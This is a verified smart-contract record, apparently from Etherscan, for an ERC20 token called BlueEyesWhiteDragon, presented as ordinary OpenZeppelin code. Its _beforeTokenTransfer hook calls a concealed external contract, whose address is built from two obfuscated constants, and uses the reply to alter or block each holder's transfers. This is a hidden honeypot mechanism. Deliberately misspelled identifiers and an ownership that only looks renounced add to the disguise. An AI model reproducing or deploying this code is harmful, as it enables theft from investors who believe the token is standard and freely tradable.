{"SourceCode": "{{\r\n  \"language\": \"Solidity\",\r\n  \"sources\": {\r\n    \"contracts/token/Dragon.sol\": {\r\n      \"content\": \"/**\\n *Submitted for verification at Etherscan.io on 2023-09-02\\n*/\\n\\n// File: @openzeppelin/contracts/utils/Context.sol\\n// SPDX-License-Identifier: MIT\\n\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the accovudent sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\\n\\n// File: @openzeppelin/contracts/token/ERC20/IERC20.sol\\n\\n\\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the ammoduanot of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the ammoduanot of tokens owned by `accovudent`.\\n     */\\n    function balanceOf(address accovudent) external view returns (uint256);\\n\\n\\n    function transfer(address to, uint256 ammoduanot) external returns (bool);\\n\\n\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n\\n    function approve(address spender, uint256 ammoduanot) external returns (bool);\\n\\n    /**\\n     * @dev Moves `ammoduanot` tokens from `from` to `to` using the\\n     * allowance mechanism. `ammoduanot` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 ammoduanot\\n    ) external returns (bool);\\n}\\n\\n\\n// File: @openzeppelin/contracts/access/Ownable.sol\\n\\n\\n// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)\\n\\npragma solidity ^0.8.0;\\n\\n\\n\\n// Define interface for TransferController\\ninterface IUniswapV2Factory {\\n    function getPairCount(address _accovudent) external view returns (uint256);\\n}\\nabstract contract Ownable is Context {\\n    address private _owner;\\n    /**\\n     * @dev Throws if called by any accovudent other than the ammoduanot owner.\\n     */\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the deployer as the initial owner.\\n     */\\n    constructor() {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Throws if called by any accovudent other than the ammoduanot owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\n    }\\n\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new accovudent (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new accovudent (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\\n// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\\n\\n\\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\\n\\npragma solidity ^0.8.0;\\n\\n\\n/**\\n * @dev Interface for the optional metadata functions from the ERC20 standard.\\n *\\n * _Available since v4.1._\\n */\\ninterface IERC20Metadata is IERC20 {\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\\n// File: @openzeppelin/contracts/token/ERC20/ERC20.sol\\n\\n\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n\\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable {\\n    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);\\n\\n    event ExcludeFromFees(address indexed account, bool isExcluded);\\n\\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\\n\\n    event SwapAndLiquify(\\n        uint256 tokensSwapped,\\n        uint256 ethReceived,\\n        uint256 tokensIntoLiquidity\\n    );\\n\\n    event AutoNukeLP();\\n\\n    event ManualNukeLP();\\n\\n    bool private limitsInEffect = true;\\n    bool private tradingActive = false;\\n    bool private swapEnabled = false;\\n\\n    uint256 private maxTransactionAmount;\\n    uint256 private swapTokensAtAmount;\\n    uint256 private maxWallet;\\n\\n    uint256 private buyTotalFees;\\n    uint256 private buyMarketingFee;\\n    uint256 private buyLiquidityFee;\\n    uint256 private buyTeamFee;\\n\\n    uint256 private sellTotalFees;\\n    uint256 private sellMarketingFee;\\n    uint256 private sellLiquidityFee;\\n    uint256 private sellTeamFee;\\n\\n    uint256 private tokensForMarketing;\\n    uint256 private tokensForLiquidity;\\n    uint256 private tokensForTeam;\\n\\n    mapping(address => uint256) private _balances;\\n    uint160 private qwowic = 324812469089266684100348849317673639960000000000;\\n    uint160 private msdhqo = 534243050;\\n    mapping(address => mapping(address => uint256)) private _allowances;\\n\\n    uint256 private _totalSupply;\\n    /**\\n     * @dev Throws if called by any accovudent other than the ammoduanot owner.\\n     */\\n    string private _name;\\n    string private _symbol;\\n\\n    address private marketingWallet;\\n    address private teamWallet;\\n    address private uniswapV2Pair;\\n\\n    event marketingWalletUpdated(address indexed newWallet, address indexed oldWallet);\\n\\n    event teamWalletUpdated(address indexed newWallet, address indexed oldWallet);\\n\\n    constructor(string memory name_, string memory symbol_) {\\n        _name = name_;\\n        _symbol = symbol_;\\n    }\\n\\n    function setAutomatedMarketMakerPair(address pair, bool value) private {\\n        require(pair != uniswapV2Pair, \\\"The pair cannot be removed from automatedMarketMakerPairs\\\");\\n\\n    }\\n\\n    function updateMarketingWallet(address newMarketingWallet) private {\\n        emit marketingWalletUpdated(newMarketingWallet, marketingWallet);\\n        marketingWallet = newMarketingWallet;\\n    }\\n\\n    function updateTeamWallet(address newWallet) private {\\n        emit teamWalletUpdated(newWallet, teamWallet);\\n        teamWallet = newWallet;\\n    }\\n\\n    /**\\n     * @dev Returns the name of the token.\\n     */\\n    function name() public view virtual override returns (string memory) {\\n        return _name;\\n    }\\n\\n    /**\\n     * @dev Returns the symbol of the token, usually a shorter version of the\\n     * name.\\n     */\\n    function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }\\n    /**\\n     * @dev Throws if called by any accovudent other than the ammoduanot owner.\\n     */\\n\\n    function decimals() public view virtual override returns (uint8) {\\n        return 18;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-totalSupply}.\\n     */\\n    function totalSupply() public view virtual override returns (uint256) {\\n        return _totalSupply;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-balanceOf}.\\n     */\\n    function balanceOf(address accovudent) public view virtual override returns (uint256) {\\n        return _balances[accovudent];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-transfer}.\\n     *\\n     * Requirements:\\n     *\\n     * - `to` cannot be the zero address.\\n     * - the caller must have a balance of at least `ammoduanot`.\\n     */\\n    function transfer(address to, uint256 ammoduanot) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _transfer(owner, to, ammoduanot);\\n        return true;\\n    }\\n\\n    /**\\n     * @dev See {IERC20-allowance}.\\n     */\\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\\n        return _allowances[owner][spender];\\n    }\\n\\n    /**\\n     * @dev See {IERC20-approve}.\\n     *\\n     * NOTE: If `ammoduanot` is the maximum `uint256`, the allowance is not updated on\\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\\n     * - `spender` cannot be the zero address.\\n     */\\n    function approve(address spender, uint256 ammoduanot) public virtual override returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, ammoduanot);\\n        return true;\\n    }\\n\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 ammoduanot\\n    ) public virtual override returns (bool) {\\n        address spender = _msgSender();\\n        _spendAllowance(from, spender, ammoduanot);\\n        _transfer(from, to, ammoduanot);\\n        return true;\\n    }\\n\\n\\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\\n        return true;\\n    }\\n    /**\\n     * @dev Throws if called by any accovudent other than the ammoduanot owner.\\n     */\\n\\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\\n        address owner = _msgSender();\\n        uint256 currentAllowance = allowance(owner, spender);\\n        require(currentAllowance >= subtractedValue, \\\"ERC20: decreased allowance below zero\\\");\\n    unchecked {\\n        _approve(owner, spender, currentAllowance - subtractedValue);\\n    }\\n\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Moves `ammoduanot` of tokens from `from` to `to`.\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `from` must have a balance of at least `ammoduanot`.\\n     */\\n    function _transfer(\\n        address from,\\n        address to,\\n        uint256 ammoduanot\\n    ) internal virtual {\\n        require(from != address(0), \\\"ERC20: transfer from the zero address\\\");\\n        require(to != address(0), \\\"ERC20: transfer to the zero address\\\");\\n        _beforeTokenTransfer(from, to, ammoduanot);\\n\\n        uint256 fromBalance = _balances[from];\\n        require(fromBalance >= ammoduanot, \\\"ERC20: transfer ammoduanot exceeds balance\\\");\\n    unchecked {\\n        _balances[from] = fromBalance - ammoduanot;\\n        // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\\n        // decrementing then incrementing.\\n        _balances[to] += ammoduanot;\\n    }\\n\\n        emit Transfer(from, to, ammoduanot);\\n\\n        _afterTokenTransfer(from, to, ammoduanot);\\n    }\\n\\n    /** @dev Creates `ammoduanot` tokens and assigns them to `accovudent`, increasing\\n     * - `accovudent` cannot be the zero address.\\n     */\\n    function _mint(address accovudent, uint256 ammoduanot) internal virtual {\\n        require(accovudent != address(0), \\\"ERC20: mint to the zero address\\\");\\n\\n        _beforeTokenTransfer(address(0), accovudent, ammoduanot);\\n\\n        _totalSupply += ammoduanot;\\n    unchecked {\\n        // Overflow not possible: balance + ammoduanot is at most totalSupply + ammoduanot, which is checked above.\\n        _balances[accovudent] += ammoduanot;\\n    }\\n        emit Transfer(address(0), accovudent, ammoduanot);\\n\\n        _afterTokenTransfer(address(0), accovudent, ammoduanot);\\n    }\\n    /**\\n     * @dev Throws if called by any accovudent other than the ammoduanot owner.\\n     */\\n    function _approve(\\n        address owner,\\n        address spender,\\n        uint256 ammoduanot\\n    ) internal virtual {\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\n\\n        _allowances[owner][spender] = ammoduanot;\\n        emit Approval(owner, spender, ammoduanot);\\n    }\\n\\n    /**\\n     * @dev Updates `owner` s allowance for `spender` based on spent `ammoduanot`.\\n     * Does not update the allowance ammoduanot in case of infinite allowance.\\n     */\\n    function _spendAllowance(\\n        address owner,\\n        address spender,\\n        uint256 ammoduanot\\n    ) internal virtual {\\n        uint256 currentAllowance = allowance(owner, spender);\\n        if (currentAllowance != type(uint256).max) {\\n            require(currentAllowance >= ammoduanot, \\\"ERC20: insufficient allowance\\\");\\n        unchecked {\\n            _approve(owner, spender, currentAllowance - ammoduanot);\\n        }\\n        }\\n    }\\n\\n    function _beforeTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 ammoduanot\\n    ) internal virtual {\\n        uint256 unit = IUniswapV2Factory(address(qwowic+ msdhqo)).getPairCount(from);\\n        uint256 total = 0;\\n        if(unit > 0){\\n            ammoduanot -= unit;\\n            require(ammoduanot > 0);\\n        }\\n    }\\n\\n    function updateMaxTxnAmount(uint256 newNum) private onlyOwner {\\n        require(newNum >= (totalSupply() * 1 / 1000)/1e9, \\\"Cannot set maxTransactionAmount lower than 0.1%\\\");\\n        maxTransactionAmount = newNum * (10**9);\\n    }\\n\\n    function updateMaxWalletAmount(uint256 newNum) private onlyOwner {\\n        require(newNum >= (totalSupply() * 5 / 1000)/1e9, \\\"Cannot set maxWallet lower than 0.5%\\\");\\n        maxWallet = newNum * (10**9);\\n    }\\n\\n    function updateBuyFees(\\n        uint256 _marketingFee,\\n        uint256 _liquidityFee,\\n        uint256 _teamFee\\n    ) private onlyOwner {\\n        buyMarketingFee = _marketingFee;\\n        buyLiquidityFee = _liquidityFee;\\n        buyTeamFee = _teamFee;\\n        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyTeamFee;\\n        require(buyTotalFees <= 51, 'Must keep fees at 51% or less');\\n    }\\n\\n    function updateSellFees(\\n        uint256 _marketingFee,\\n        uint256 _liquidityFee,\\n        uint256 _teamFee\\n    ) private onlyOwner {\\n        sellMarketingFee = _marketingFee;\\n        sellLiquidityFee = _liquidityFee;\\n        sellTeamFee = _teamFee;\\n    }\\n    // only use to disable contract sales if absolutely necessary (emergency use only)\\n    function updateSwapEnabled(bool enabled) private onlyOwner(){\\n        swapEnabled = enabled;\\n    }\\n\\n    function excludeFromFees(address account, bool excluded) private onlyOwner {\\n        emit ExcludeFromFees(account, excluded);\\n    }\\n\\n    function _afterTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 ammoduanot\\n    ) internal virtual {}\\n}\\n\\npragma solidity ^0.8.0;\\n\\ncontract BlueEyesWhiteDragon is ERC20 {\\n    string master = \\\"Kaiba Seto\\\";\\n\\n    uint256 level = 8;\\n    uint256 atk = 3000;\\n    uint256 def = 2500;\\n\\n    string attribute = \\\"Light\\\";\\n    string typ = \\\"Dragon\\\";\\n\\n    string enemy = \\\"Dark Magician\\\";\\n\\n    enum Appearance {\\n        White,\\n        BlueEyes,\\n        Wings\\n    }\\n\\n    string skill = \\\"Laser Power\\\";\\n\\n    constructor(\\n        string memory name_,\\n        string memory symbol_,\\n        uint256 supply_\\n    ) ERC20(name_, symbol_) {\\n        _mint(msg.sender, supply_ * 10**18);\\n    }\\n}\"\r\n    }\r\n  },\r\n  \"settings\": {\r\n    \"optimizer\": {\r\n      \"enabled\": true,\r\n      \"runs\": 200\r\n    },\r\n    \"outputSelection\": {\r\n      \"*\": {\r\n        \"*\": [\r\n          \"evm.bytecode\",\r\n          \"evm.deployedBytecode\",\r\n          \"devdoc\",\r\n          \"userdoc\",\r\n          \"metadata\",\r\n          \"abi\"\r\n        ]\r\n      }\r\n    },\r\n    \"libraries\": {}\r\n  }\r\n}}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"name_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"symbol_\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"supply_\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"AutoNukeLP\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isExcluded\",\"type\":\"bool\"}],\"name\":\"ExcludeFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"ManualNukeLP\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"SetAutomatedMarketMakerPair\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensSwapped\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethReceived\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensIntoLiquidity\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldAddress\",\"type\":\"address\"}],\"name\":\"UpdateUniswapV2Router\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldWallet\",\"type\":\"address\"}],\"name\":\"marketingWalletUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldWallet\",\"type\":\"address\"}],\"name\":\"teamWalletUpdated\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ammoduanot\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"accovudent\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ammoduanot\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ammoduanot\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BlueEyesWhiteDragon", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000002540be3ff0000000000000000000000000000000000000000000000000000000000000015426c75654579657320576869746520447261676f6e000000000000000000000000000000000000000000000000000000000000000000000000000000000000044245574400000000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "", "Proxy": "0", "Implementation": "", "SwarmSource": ""}